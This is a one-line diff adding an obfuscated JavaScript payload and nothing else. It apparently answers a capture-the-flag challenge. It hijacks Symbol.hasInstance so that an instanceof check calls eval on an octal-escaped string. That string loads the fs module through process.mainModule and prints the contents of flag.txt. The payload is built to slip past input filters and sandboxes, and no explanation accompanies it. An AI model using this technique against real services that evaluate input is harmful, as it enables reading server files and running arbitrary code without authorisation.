@@ -1,0 +1,1 @@
+[global[Symbol["hasInstance"]]=eval]+["console\056log\050\160rocess\056mainMod\165le\056req\165ire\050'fs'\051\056readFileSync\050'flag\056t\170t'\054'\165tf8'\051\051"instanceof global]
